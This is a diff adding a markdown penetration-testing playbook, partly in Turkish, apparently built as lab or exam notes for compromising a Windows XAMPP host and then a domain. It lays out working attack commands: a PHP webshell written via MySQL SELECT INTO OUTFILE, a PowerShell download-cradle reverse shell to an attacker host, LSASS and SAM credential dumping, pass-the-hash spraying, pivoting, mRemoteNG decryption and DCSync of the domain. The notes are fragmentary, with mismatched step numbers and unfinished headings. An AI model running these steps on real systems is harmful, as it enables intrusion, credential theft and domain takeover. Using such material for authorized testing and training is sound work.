@@ -1,0 +1,495 @@
+
+## XAMPP Credential File Discovery
+
+Foothold reached (LFI/RCE/creds already obtained) → hunt XAMPP's known-weak config/cred files first, they're near-guaranteed on default installs.
+
+```bash
+# Default XAMPP paths (Windows)
+type C:\xampp\phpMyAdmin\config.inc.php
+type C:\xampp\mysql\bin\my.ini
+type C:\xampp\apache\conf\extra\httpd-xampp.conf
+dir /s /b C:\xampp\htdocs\*.php | findstr /i "config db conn"
+type C:\xampp\htdocs\*\config*.php
+```
+
+**Decision point:** hardcoded `$cfg['Servers'][$i]['user']` / `$cfg['Servers'][$i]['password']` found in `config.inc.php` → go to step 2 (MySQL credential reuse). If root has no password (XAMPP default `root:` empty) → skip straight to step 3.
+
+---
+
+## MySQL Credential Reuse
+
+Test recovered creds directly against MySQL — XAMPP MySQL is usually bound to 127.0.0.1 only, so this is normally done from the shell you already have, or tunneled.
+
+```bash
+mysql -h 127.0.0.1 -u root -p'<recovered_pw>' -e "SHOW DATABASES;"
+mysql -h 127.0.0.1 -u <user> -p'<recovered_pw>' -e "SELECT user,authentication_string,host FROM mysql.user;"
+```
+
+**Decision point:** login succeeds and the account has `FILE` privilege (`SHOW GRANTS;`) → step 3. No `FILE` priv → look for other DB-based vectors (UDF injection if `plugin_dir` writable, or just loot data) instead.
+
+---
+
+## MySQL `SELECT INTO OUTFILE` → Webshell
+
+Abuse `FILE` privilege to drop a PHP webshell inside the web root.
+
+```sql
+-- confirm FILE priv and web root path first
+SHOW VARIABLES LIKE 'secure_file_priv';
+SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
+```
+
+```bash
+# if secure_file_priv is empty or matches htdocs, this works directly
+curl "http://<target>/shell.php?cmd=whoami"
+```
+
+**Decision point:** `secure_file_priv` is empty or set to a path containing the web root → outfile write succeeds. If it's set to a different restricted dir → try UDF (`lib_mysqludf_sys`) injection instead, or look for another writable/web-exposed path.
+
+---
+
+## 4. Webshell → SYSTEM RCE
+
+XAMPP's Apache service on Windows almost always runs as `NT AUTHORITY\SYSTEM` by default — webshell RCE is frequently already SYSTEM, confirm before escalating further.
+
+```bash
+curl "http://<target>/shell.php?cmd=whoami"
+curl "http://<target>/shell.php?cmd=whoami+/priv"
+```
+
+|Finding|Next move|
+|---|---|
+|`whoami` returns `nt authority\system`|already SYSTEM — skip to step 5 directly|
+|Apache running as local service/user|standard Windows privesc methodology (services, tokens, AlwaysInstallElevated) before continuing chain|
+|Need interactive shell instead of one-liners|upgrade via `nc.exe`/reverse shell or msfvenom staged payload through the webshell|
+
+```bash
+# upgrade to a stable reverse shell if needed
+curl "http://<target>/shell.php?cmd=powershell+-c+IEX(New-Object+Net.WebClient).DownloadString('http://<lhost>/shell.ps1')"
+```
+
+---
+
+## LSASS Credential Dumping / Mimikatz
+
+With SYSTEM, dump LSASS to recover plaintext creds / hashes for reuse elsewhere on the network.
+
+```powershell
+# via Mimikatz (upload first)
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+
+# OR living-off-the-land dump for offline parsing
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\lsass.dmp full
+```
+
+```bash
+# offline parse if dumped via comsvcs.dll (transfer lsass.dmp off-box first)
+pypykatz lsa minidump lsass.dmp
+```
+
+**Decision point:** Defender/AV present → prefer `comsvcs.dll` dump + offline `pypykatz` parse over dropping Mimikatz binary. Note in your report which method was used and why (noise/AV consideration).
+
+---
+
+## Credential Reuse / Password Spraying
+
+Take every credential recovered so far (XAMPP config, LSASS) and spray it across discovered hosts/services.
+
+```bash
+netexec smb <target_range> -u <user> -p '<password>' --continue-on-success
+netexec winrm <target_range> -u <user> -p '<password>'
+crackmapexec smb <target_range> -u users.txt -p passwords.txt --continue-on-success
+```
+
+**Decision point:** hit on a new host → enumerate that host's shares/sessions before moving on; don't stop at first hit, log every host+account combo that authenticates.
+
+---
+
+## Network Pivoting with Ligolo-ng
+
+New internal network segment discovered from the compromised box (second NIC, ARP table, routing table) → pivot instead of running everything through the webshell.
+
+```bash
+# attacker side
+./proxy -selfcert
+
+# on compromised host (agent)
+.\agent.exe -connect <attacker_ip>:11601 -ignore-cert
+```
+
+---
+
+## mRemoteNG Stored Credential Extraction
+
+Pivoted host or original box has mRemoteNG installed (common on admin jump boxes) → its saved connections file holds encrypted creds for other infrastructure.
+
+```powershell
+dir /s /b confCons.xml
+type "$env:APPDATA\mRemoteNG\confCons.xml"
+```
+
+## mRemoteNG `confCons.xml` Password Decryption
+
+mRemoteNG uses AES-128-CBC with a hardcoded default key ("mR3m") unless the user set a custom master password — try default first.
+
+```bash
+# mremoteng_decrypt (multiple tool options exist, e.g. from CiscoCXSecurity or kmahyyg fork)
+python3 mremoteng_decrypt.py -s "<encrypted_password_blob>"
+```
+
+**Decision point:** decrypt succeeds with default key → creds recovered, go to step 6 pattern (reuse them) or continue chain. Fails → custom master password set; check `PowerShell PSReadLine history` (step 10) or other loot for the master password before giving up on this file.
+
+---
+
+## PowerShell PSReadLine History Credential Leakage
+
+Any host reached (original box, pivoted box, admin jump box) → PSReadLine logs every command typed interactively, frequently including plaintext creds from `net use`, `runas`, or manual `$cred` assignments.
+
+```powershell
+(Get-PSReadlineOption).HistorySavePath
+type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+findstr /i "password pwd runas net use" "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+```
+
+## SMB Share Enumeration
+
+With every credential set gathered so far, sweep SMB shares across the domain for anything readable.
+
+```bash
+netexec smb <target_range> -u <user> -p '<password>' --shares
+smbclient -L //<target>/ -U '<user>%<password>'
+smbmap -H <target> -u <user> -p '<password>' -r
+```
+
+## Sensitive Backup File Discovery
+
+Inside accessible shares (and locally on any host) — hunt for backup files that commonly contain registry hive dumps or config secrets.
+
+```bash
+smbclient //<target>/<share> -U '<user>%<password>' -c 'recurse ON; prompt OFF; mget *.bak *.old *.zip *.7z *.dmp *.reg'
+```
+
+```powershell
+# locally on a host
+Get-ChildItem -Recurse -Include *.bak,*.old,*.zip,*.7z,*.dmp,*.reg -ErrorAction SilentlyContinue C:\
+```
+
+## SAM + SYSTEM Hive Extraction
+
+Either recovered directly from a backup (step 12) or extracted live from a host you have admin on.
+
+```powershell
+# live extraction (requires local admin)
+reg save HKLM\SAM C:\Windows\Temp\sam.save
+reg save HKLM\SYSTEM C:\Windows\Temp\system.save
+reg save HKLM\SECURITY C:\Windows\Temp\security.save
+```
+
+```bash
+secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+```
+
+## NTLM Credential Reuse / Pass-the-Hash
+
+Take every NTLM hash recovered and spray/PtH across the environment — no cracking needed.
+
+```bash
+netexec smb <target_range> -u <user> -H '<ntlm_hash>' --continue-on-success
+netexec smb <target_range> -u <user> -H '<ntlm_hash>' -x whoami
+evil-winrm -i <target> -u <user> -H '<ntlm_hash>'
+psexec.py <domain>/<user>@<target> -hashes ':<ntlm_hash>'
+```
+
+## Lateral Movement to Domain Controller
+
+Credential/hash from step 15 grants access to a host with a path toward the DC (domain admin session, DCSync rights, or direct DC local admin).
+
+```bash
+# confirm DC reachability + identify DC
+netexec smb <dc_ip> -u <user> -H '<ntlm_hash>'
+
+# if domain admin hash/creds obtained
+psexec.py <domain>/<domain_admin>@<dc_ip> -hashes ':<ntlm_hash>'
+evil-winrm -i <dc_ip> -u <domain_admin> -H '<ntlm_hash>'
+
+# if DCSync rights instead of direct admin
+secretsdump.py <domain>/<user>@<dc_ip> -hashes ':<ntlm_hash>' -just-dc
+```
+
+## 17. Domain Controller Privilege Escalation / Domain Compromise
+
+Final confirmation and full domain credential extraction.
+
+```bash
+# dump the entire domain (NTDS.dit + hashes for every domain account)
+secretsdump.py <domain>/<domain_admin>@<dc_ip> -hashes ':<ntlm_hash>'
+
+# confirm SYSTEM/domain admin on DC interactively
+whoami
+whoami /groups
+```
+
+Domain compromised once `krbtgt` hash and all domain-user NTLM hashes are dumped — this also enables Golden Ticket persistence if in scope.
+
+---
+
+## Priority Fast-Path Summary (try these first)
+
+1. **XAMPP config.inc.php → MySQL FILE priv → webshell** — this is almost always the intended foothold-to-execution vector when XAMPP is present; check it before anything else.
+2. **Webshell = SYSTEM check immediately** — don't waste time on Windows privesc methodology until you've confirmed you're not already SYSTEM via the Apache service account.
+3. **PSReadLine history on every host you land on** — highest signal-to-effort credential source, check it before deep-diving any other loot vector.
+4. **mRemoteNG confCons.xml with default key** — near-instant win if the file exists and no custom master password was set.
+5. **SAM/SYSTEM extraction → secretsdump → PtH spray** — the reliable fallback path to lateral movement even if no plaintext creds are ever found.
+6. **DCSync rights check as soon as any domain account is compromised** — often faster to full domain compromise than chasing a direct DA session.
+
+---
+### 1. Nmap taraması
+
+`nmap -sC -sV <IP>` sonucu **110 (POP3)** ve **43 (WHOIS)** 
+
+### 2. WHOIS sorgusu
+
+```
+echo "<domain>" | nc <IP> 43
+```
+
+WHOIS protokolü ham TCP üzerinden çalışır (WHOIS client'a gerek yok), bir domain/query string gönderirsin, sunucu ham text döner.
+
+- **Muhtemel sonuç:** Dönen kayıtta bir admin/registrant contact alanı içinde bir **username** sızmış (örn. "Admin Contact: sysadmin" gibi).
+- **Sonraki adıma karar:** Elde edilen isim bir login denemesi için aday.
+
+### 3. İlk login denemesi — username:username
+
+```
+telnet <IP> 110
+USER sysadmin
+PASS sysadmin
+LIST
+RETR 1
+```
+
+### Sudo version kontrolü
+
+```
+sudo -V
+```
+
+- **CVE-2021-3156** (Baron Samedit) — sudo < 1.9.5p2, heap overflow
+- **CVE-2019-18634** — `pwfeedback` aktifse, sudo < 1.8.31
+- **CVE-2023-22809** — sudoedit ile dosya izinleri bypass
+
+### 2. SMB Null Session
+
+```
+smbclient -N -L //<IP>/
+```
+
+### 3. Kullanıcı listesi çekme
+
+`nxc` (NetExec) ile:
+
+```
+nxc smb <IP> -u '' -p '' --users
+```
+
+**Diğer yöntemler** (senin sorduğun kısım):
+
+- `rpcclient -U "" -N <IP>` → içeride `enumdomusers`
+- `enum4linux -U <IP>` veya `enum4linux-ng -U <IP>`
+- `smbmap -u '' -p '' -H <IP>` (daha çok share listelemek için ama bazen user bilgisi de verir)
+- LDAP açıksa: `ldapsearch` ile de kullanıcı+description çekilebilir
+
+### 4. Description alanında credential
+
+Windows'ta AD kullanıcı objesinin "description" alanı serbest metin — sistem yöneticileri bazen parolayı buraya not düşer (kötü pratik ama OSCP'de klasik bir vuln). `nxc --users` veya `rpcclient`'daki `queryuser` çıktısında bu alan görünür.
+
+### `MUST_CHANGE`
+
+`-M change_password`
+
+```
+nxc smb <IP> -u <user> -p '<eski_parola>' -M change_password -o NEWPASS='<yeni_parola>'
+```
+
+```
+evil-winrm -i <IP> -u <user> -p '<yeni_parola>'
+```
+
+
+---
+
+### AŞAMA 1: İlk Foothold ile Enumeration
+
+**"ilk cred -> users, shares -> extract smb"**
+
+Bir yerden (muhtemelen önceki bir kutu/leak/başka bir path) ele geçirdiğin credential ile:
+
+```
+nxc smb <IP> -u <user> -p <pass> --users
+nxc smb <IP> -u <user> -p <pass> --shares
+```
+
+**"extract smb"** — evet, tahminin doğru, bu bir dosya adı/işlemi değil, muhtemelen bulduğun bir share'e bağlanıp içeriği çekme işlemi:
+
+```
+smbclient //<IP>/<share> -U <user>
+smbmap -u <user> -p <pass> -H <IP> -R
+```
+
+---
+
+### XAMPP Keşfi
+
+XAMPP kurulumlarında varsayılan olarak `\xampp\passwords.txt` dosyası
+
+---
+
+###  MySQL → RCE (En kritik kısım)
+
+**3.1 — `/bin` 
+```
+mysql.exe -u root -p<pass> -h <target_ip>
+```
+
+**3.2 — `htdocs`
+XAMPP'ta web root'u `C:\xampp\htdocs\` şeklindedir. MySQL'in `FILE` yetkisi varsa (root genelde vardır), `SELECT ... INTO OUTFILE` ile **web root'a doğrudan dosya yazabilirsin** — yazdığın dosya tarayıcıdan erişilebilir olur.
+
+**3.3 — OUTFILE ile webshell yazma:**
+
+```sql
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:/xampp/htdocs/shell.php";
+```
+
+**3.4 — HEX encode 
+
+```sql
+SELECT 0x3c3f70687020737973 -- (hex encoded "<?php syst..." vs.)
+INTO OUTFILE "C:/xampp/htdocs/shell.php";
+```
+
+PHP payload'ını hex'e çevirmek için:
+
+```bash
+echo -n '<?php system($_GET["cmd"]); ?>' | xxd -p | tr -d '\n'
+```
+
+Çıkan hex'in başına `0x` ekleyip query'de kullanırsın.
+
+```
+http://<IP>/shell.php?cmd=whoami
+```
+
+---
+
+### Pivot ve Credential Harvesting
+
+**Ligolo-ng ile pivot:**
+
+```
+# Attacker tarafında proxy başlat
+./proxy -selfcert
+# Hedefte agent çalıştır
+./agent -connect <attacker_ip>:11601 -ignore-cert
+```
+
+Bu sana ele geçirdiğin makine üzerinden **ikinci ağa (internal network) tünel** açar.
+
+**Mimikatz ile hash toplama:**
+
+```
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+**Tüm hash'leri tek seferde almak için one-liner:**
+
+```
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "lsadump::sam" "exit"
+```
+
+veya offline/uzaktan (creds varsa) impacket ile:
+
+```bash
+secretsdump.py <domain>/<user>:<pass>@<IP>
+```
+
+bu tek komutla hem SAM hem LSA secrets hem de (DC ise) NTDS.dit hash'lerini döker.
+
+---
+
+### İkinci Makine
+
+**"spray -> foothold -> All Users"**
+
+Elde ettiğin hash(ler) ile pivot ettiğin ağdaki diğer makinelere spray:
+
+```
+nxc smb <ip_range> -u <user> -H <hash>
+```
+
+Başarılı olan makineye giriş sağlanır (foothold).
+
+```
+dir C:\Users\
+```
+
+---
+### mRemoteNG → Credential Decrypt
+
+**config.xml:** Gerçek dosya adı genelde `confCons.xml`, şu yolda bulunur:
+
+```
+C:\Users\<user>\AppData\Roaming\mRemoteNG\confCons.xml
+```
+
+İçinde her bağlantı için `Password="..."` alanı **AES ile şifrelenmiş** olarak durur.
+
+**Decrypt (py):**  
+
+```bash
+python3 mremoteng_decrypt.py -s <encrypted_password_string>
+```
+
+---
+
+### Post-Exploitation — PowerShell History
+
+**"mimikatz -> powershell history, PSReadLine"**
+
+**PSReadLine nedir:** PowerShell'in komut geçmişini tutan modül. Kullanıcının yazdığı **her komut** (parolalar dahil, eğer biri hata yapıp komut satırına düz parola yazdıysa) diske kaydedilir.
+
+**Nerede ve nasıl okunur:**
+
+```powershell
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+veya tam yol:
+
+```
+C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+
+---
+
+### SMB Share → SAM/SYSTEM → secretsdump
+
+```bash
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+```
+
+Bu, offline olarak local hash'leri (SAM) çıkarır. Eğer hedefe network üzerinden direkt admin credential ile erişimin varsa, dosyaları çekmeden de direkt:
+
+```bash
+secretsdump.py <domain>/<user>:<pass>@<IP>
+```
+
+ile aynı sonucu (uzaktan) alabilirsin.
+
+```bash
+evil-winrm -i <DC_IP> -u <DA_user> -H <NTLM_hash>
+```
+
